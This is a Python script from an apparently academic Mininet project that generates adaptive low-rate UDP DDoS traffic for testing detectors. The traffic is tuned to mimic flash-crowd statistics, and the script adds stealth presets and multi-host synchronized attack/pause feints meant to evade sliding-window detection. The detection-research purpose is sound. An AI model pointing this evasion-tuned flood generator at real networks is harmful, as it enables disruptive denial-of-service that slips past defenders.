#!/usr/bin/env python3
"""
Step 6/7: Adaptive flash-crowd-mimicking low-rate DDoS generator.

Unlike naive_ddos_traffic.py (Step 5), this does NOT use a fixed rate,
zero jitter, or synchronized onset -- all of which are easy, obvious
tells. Instead it is deliberately tuned to be statistically similar to
flash_crowd_traffic.py (Step 4):

  - per-flow rate drawn from the SAME range real flash-crowd traffic uses
  - jitter of the SAME magnitude real traffic has (not near-zero)
  - a ramp-up in aggregate load, via a flow-creation PROBABILITY that
    itself increases over time (--prob-start -> --prob-end over
    --ramp-up seconds) -- the "ramp-up slope" lever from the spec

Architectural note: instead of pre-planning N virtual users with fixed
random start offsets, this runs a continuous spawner loop. Every
--check-interval seconds it rolls a random draw against the current
flow-creation probability; if it hits, and we're under --max-flows
concurrent flows, a new worker flow is spawned with a random rate and
a random finite lifetime. Flows die off and get replaced continuously,
so the population churns rather than ending all at once -- a more
sustained, continuously-renewing presence than a one-off flash-crowd
event.

Source-IP entropy is NOT handled inside this script: we are not
spoofing addresses (per the project's design choice), so entropy is
controlled at the orchestration level by how many real Mininet hosts
you run this script on simultaneously (use the same host set as the
flash-crowd scenario for a fair comparison).

Step 7: --attack-level {subtle,moderate,aggressive} selects a PRESET
that moves several knobs together, representing a real stealth-vs-impact
trade-off:
  - subtle:     slow ramp, low spawn probability, few concurrent flows,
                rate range overlapping normal traffic, generous jitter.
                Closest to genuine flash-crowd statistics; lowest load.
  - moderate:   the Step 6 defaults -- balanced evasion and impact.
  - aggressive: fast ramp, high spawn probability, many concurrent flows,
                higher rate, LOWER jitter. Trades stealth for impact --
                this is deliberately where it starts drifting toward the
                naive attack's signature.
Any individual knob still given explicitly on the CLI (e.g. --rate-min)
overrides just that one value from the chosen preset, so presets are a
convenience, not a restriction.

Step 8: feint/pause oscillation, i.e. "Attack -> Attack -> Feint/Pause ->
Attack -> Attack -> Feint/Pause". Each attack level now also carries a
--feint-pattern (a string of 'A'=attack, 'P'=pause symbols, repeating),
--attack-duration and --pause-duration (seconds per symbol). During a
pause the attacker goes COMPLETELY silent -- no packets at all, not even
new flow spawns -- which is what lets it evade a detector that
accumulates suspicion over a sliding time window: pausing before that
window fills resets the count.

Multiple attacking hosts need to pause/resume TOGETHER to look like one
coordinated campaign rather than independent noise. There's no shared
IPC between Mininet host processes here, so synchronization is done via
wall-clock time instead: compute ONE --start-at unix timestamp and pass
the SAME value to every attacking host's invocation. Each process then
independently derives its current phase from
    (now - start_at) mod (sum of the pattern's phase lengths)
-- fully deterministic, no coordinator process or shared file needed.
If --start-at is omitted, each process just starts counting from its
own launch time (fine for a single-host test, NOT fine for a multi-host
synchronized feint).

A JSON sidecar is written next to --log (same path, .json extension)
recording the fully resolved config, including the feint schedule, so
the experiment is reproducible and Member 2/3 have ground truth to
check their own pause-detection against (since paused periods show up
only as timestamp GAPS in the CSV, not as explicit rows -- a real
evading attacker doesn't send fake markers while going dark).

Run (inside Mininet, from the CLI, after the server is listening on h1):
    mininet> py import time; START = time.time() + 3
    mininet> h2 python3 trafficgen/adaptive_ddos_traffic.py \
                 --src-name=h2 --dst-name=h1 --dst-ip=10.0.0.1 \
                 --duration=30 --attack-level=moderate --start-at=START \
                 --log=logs/adaptive_h2.csv &
    mininet> h3 python3 trafficgen/adaptive_ddos_traffic.py \
                 --src-name=h3 --dst-name=h1 --dst-ip=10.0.0.1 \
                 --duration=30 --attack-level=moderate --start-at=START \
                 --log=logs/adaptive_h3.csv &
(see run_adaptive.sh for a ready-made wrapper that does this for you)
"""
import argparse
import json
import os
import random
import socket
import threading
import time
import uuid

from common import CsvLogger

# Step 7/8: attack-level presets. Each one moves several knobs together to
# represent a coherent stealth-vs-impact posture, rather than a single
# isolated parameter. Tune these together if you recalibrate.
# feint_pattern/attack_duration/pause_duration (Step 8) are each level's
# default pause rhythm: subtle pauses as long as it attacks (cautious),
# aggressive attacks much more than it pauses (prioritizes impact).
ATTACK_LEVEL_PRESETS = {
    "subtle": dict(
        ramp_up=15.0, prob_start=0.03, prob_end=0.25, check_interval=0.5,
        max_flows=2, rate_min=5.0, rate_max=10.0, jitter=0.20,
        flow_lifetime_min=6.0, flow_lifetime_max=14.0,
        feint_pattern="AAP", attack_duration=5.0, pause_duration=5.0,
    ),
    "moderate": dict(
        ramp_up=8.0, prob_start=0.05, prob_end=0.6, check_interval=0.5,
        max_flows=4, rate_min=5.0, rate_max=15.0, jitter=0.15,
        flow_lifetime_min=5.0, flow_lifetime_max=12.0,
        feint_pattern="AAP", attack_duration=6.0, pause_duration=4.0,
    ),
    "aggressive": dict(
        ramp_up=4.0, prob_start=0.10, prob_end=0.9, check_interval=0.3,
        max_flows=7, rate_min=10.0, rate_max=25.0, jitter=0.08,
        flow_lifetime_min=3.0, flow_lifetime_max=8.0,
        feint_pattern="AAAP", attack_duration=5.0, pause_duration=2.0,
    ),
}
# These are the knobs a preset fills in; a CLI flag left at its default
# (None) takes the preset's value, an explicitly-given one overrides it.
_PRESET_KEYS = ["ramp_up", "prob_start", "prob_end", "check_interval",
                "max_flows", "rate_min", "rate_max", "jitter",
                "flow_lifetime_min", "flow_lifetime_max",
                "feint_pattern", "attack_duration", "pause_duration"]


def resolve_params(args):
    """Merge the chosen attack-level preset with any explicit CLI overrides."""
    preset = ATTACK_LEVEL_PRESETS[args.attack_level]
    resolved = {}
    for key in _PRESET_KEYS:
        cli_value = getattr(args, key)
        resolved[key] = preset[key] if cli_value is None else cli_value
    return resolved


_lock = threading.Lock()
_active_flows = 0


def _flow_started():
    global _active_flows
    with _lock:
        _active_flows += 1


def _flow_ended():
    global _active_flows
    with _lock:
        _active_flows -= 1


def _active_count():
    with _lock:
        return _active_flows


def compute_phase(now, start_at, pattern, attack_duration, pause_duration):
    """Returns (phase, seconds_remaining_in_this_phase).

    phase is 'attack' or 'pause'. Before start_at is reached, everyone
    is in 'pause' (waiting for the synchronized start) -- this is the
    one case handled separately below, since (now - start_at) would
    otherwise be negative and wrap around the cycle via Python's %
    into a bogus phase.
    """
    if now < start_at:
        return "pause", start_at - now

    lengths = {"A": attack_duration, "P": pause_duration}
    total_cycle = sum(lengths[c] for c in pattern)
    if total_cycle <= 0:
        return "attack", float("inf")

    elapsed = (now - start_at) % total_cycle
    acc = 0.0
    for c in pattern:
        length = lengths[c]
        if elapsed < acc + length:
            return ("attack" if c == "A" else "pause"), (acc + length - elapsed)
        acc += length
    return "attack", total_cycle  # shouldn't be reached


def worker(idx, src_name, dst_name, dst_ip, dst_port, rate_pps, jitter_frac,
           pkt_size, lifetime, logger, attack_level, feint_cfg):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    flow_id = "adaptive-%s-%s-w%d-%s" % (src_name, dst_name, idx, uuid.uuid4().hex[:8])
    payload = b"A" * pkt_size
    base_interval = 1.0 / rate_pps

    _flow_started()
    end_time = time.time() + lifetime
    last_send = time.time()
    sent = 0
    try:
        while time.time() < end_time:
            now = time.time()
            phase, remaining = compute_phase(
                now, feint_cfg["start_at"], feint_cfg["pattern"],
                feint_cfg["attack_duration"], feint_cfg["pause_duration"])

            if phase == "pause":
                # Go completely dark: no send, no log row. Re-check
                # soon in case our own lifetime ends mid-pause.
                time.sleep(min(remaining, 0.5, max(0.0, end_time - now)))
                continue

            jitter = random.uniform(-jitter_frac, jitter_frac) * base_interval
            time.sleep(max(0.0, base_interval + jitter))

            now = time.time()
            inter_arrival = now - last_send
            last_send = now

            sock.sendto(payload, (dst_ip, dst_port))
            sent += 1

            logger.log(
                timestamp=round(now, 6),
                scenario="adaptive_ddos",
                source_host=src_name,
                destination_host=dst_name,
                packet_rate=round(rate_pps, 3),
                flow_rate=_active_count(),
                inter_arrival_time=round(inter_arrival, 6),
                jitter=round(jitter, 6),
                flow_id=flow_id,
                attack_level=attack_level,
                feint_state=phase,
            )
    finally:
        _flow_ended()
    return sent


def _worker_entry(result_holder, *args):
    result_holder.append(worker(*args))


def current_spawn_prob(t_elapsed, ramp_up, prob_start, prob_end):
    """Linear ramp of flow-creation probability from prob_start to
    prob_end over the ramp_up window, then hold at prob_end. This is
    the configurable 'ramp-up slope' -- a small (prob_end-prob_start)
    over a long ramp_up is a shallow, cautious ramp; a large jump over
    a short ramp_up is steep and more conspicuous."""
    if ramp_up <= 0 or t_elapsed >= ramp_up:
        return prob_end
    frac = t_elapsed / ramp_up
    return prob_start + frac * (prob_end - prob_start)


def run(args):
    p = resolve_params(args)

    start_at = args.start_at if args.start_at is not None else time.time() + args.start_delay
    feint_cfg = {
        "start_at": start_at,
        "pattern": p["feint_pattern"],
        "attack_duration": p["attack_duration"],
        "pause_duration": p["pause_duration"],
    }

    meta = {
        "src_name": args.src_name, "dst_name": args.dst_name, "dst_ip": args.dst_ip,
        "dst_port": args.dst_port, "duration": args.duration,
        "attack_level": args.attack_level, "resolved_params": p,
        "start_at": start_at,
    }
    meta_path = os.path.splitext(args.log)[0] + ".json"
    os.makedirs(os.path.dirname(os.path.abspath(meta_path)), exist_ok=True)
    with open(meta_path, "w") as f:
        json.dump(meta, f, indent=2)
    print("[%s] attack_level=%s start_at=%.3f feint=%s(A=%ss,P=%ss) -> meta: %s" % (
        args.src_name, args.attack_level, start_at, p["feint_pattern"],
        p["attack_duration"], p["pause_duration"], meta_path))

    logger = CsvLogger(args.log)
    threads = []
    results = []
    start = time.time()
    end_time = start + args.duration
    worker_idx = 0

    while time.time() < end_time:
        now = time.time()
        phase, remaining = compute_phase(
            now, feint_cfg["start_at"], feint_cfg["pattern"],
            feint_cfg["attack_duration"], feint_cfg["pause_duration"])

        if phase == "pause":
            # No new flows while feinting -- a real attacker going dark
            # doesn't keep opening new connections either.
            time.sleep(min(remaining, p["check_interval"], max(0.0, end_time - now)))
            continue

        t_elapsed = now - max(start, feint_cfg["start_at"])
        prob = current_spawn_prob(t_elapsed, p["ramp_up"], p["prob_start"], p["prob_end"])

        if _active_count() < p["max_flows"] and random.random() < prob:
            time_left = end_time - time.time()
            lifetime = min(random.uniform(p["flow_lifetime_min"], p["flow_lifetime_max"]),
                           time_left)
            if lifetime > 0.5:
                rate_pps = random.uniform(p["rate_min"], p["rate_max"])
                holder = []
                t = threading.Thread(target=_worker_entry, args=(
                    holder, worker_idx, args.src_name, args.dst_name, args.dst_ip,
                    args.dst_port, rate_pps, p["jitter"], args.pkt_size, lifetime,
                    logger, args.attack_level, feint_cfg))
                t.start()
                threads.append(t)
                results.append(holder)
                worker_idx += 1

        time.sleep(p["check_interval"])

    for t in threads:
        t.join()
    logger.close()

    total_sent = sum(h[0] for h in results if h)
    print("[%s] adaptive DDoS done: %d worker flows spawned, %d packets total, log: %s"
          % (args.src_name, worker_idx, total_sent, args.log))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--src-name", required=True)
    ap.add_argument("--dst-name", required=True)
    ap.add_argument("--dst-ip", required=True)
    ap.add_argument("--dst-port", type=int, default=5000)
    ap.add_argument("--duration", type=float, default=30.0)

    ap.add_argument("--attack-level", default="moderate",
                     choices=sorted(ATTACK_LEVEL_PRESETS.keys()),
                     help="selects a coherent knob preset (see module docstring)")

    # All of these default to None so the chosen --attack-level preset
    # applies; pass any of them explicitly to override just that one knob.
    ap.add_argument("--ramp-up", type=float, default=None,
                     help="seconds over which spawn probability ramps up")
    ap.add_argument("--prob-start", type=float, default=None,
                     help="flow-creation probability per check-interval at t=0")
    ap.add_argument("--prob-end", type=float, default=None,
                     help="flow-creation probability per check-interval after ramp-up")
    ap.add_argument("--check-interval", type=float, default=None,
                     help="seconds between spawn-probability rolls")
    ap.add_argument("--max-flows", type=int, default=None,
                     help="cap on concurrent worker flows per host")

    ap.add_argument("--rate-min", type=float, default=None,
                     help="per-flow rate range -- match flash_crowd_traffic.py for mimicry")
    ap.add_argument("--rate-max", type=float, default=None)
    ap.add_argument("--jitter", type=float, default=None,
                     help="fractional jitter -- match normal/flash-crowd magnitude")
    ap.add_argument("--pkt-size", type=int, default=128)

    ap.add_argument("--flow-lifetime-min", type=float, default=None)
    ap.add_argument("--flow-lifetime-max", type=float, default=None)

    # Step 8: feint/pause knobs. feint-pattern/attack-duration/
    # pause-duration follow the same preset+override rule as everything
    # else above. start-at/start-delay are orchestration-only -- NOT
    # part of any preset -- since they control multi-host synchronization,
    # not attack behavior.
    ap.add_argument("--feint-pattern", default=None,
                     help="cycle of A(attack)/P(pause) symbols, e.g. 'AAP'")
    ap.add_argument("--attack-duration", type=float, default=None,
                     help="seconds per 'A' symbol in feint-pattern")
    ap.add_argument("--pause-duration", type=float, default=None,
                     help="seconds per 'P' symbol in feint-pattern")
    ap.add_argument("--start-at", type=float, default=None,
                     help="unix epoch timestamp all attacking hosts should share, "
                          "for a synchronized feint schedule across hosts")
    ap.add_argument("--start-delay", type=float, default=3.0,
                     help="fallback: start-at = now + this, if --start-at not given")

    ap.add_argument("--log", default="logs/adaptive_ddos.csv")
    args = ap.parse_args()

    run(args)


if __name__ == "__main__":
    main()
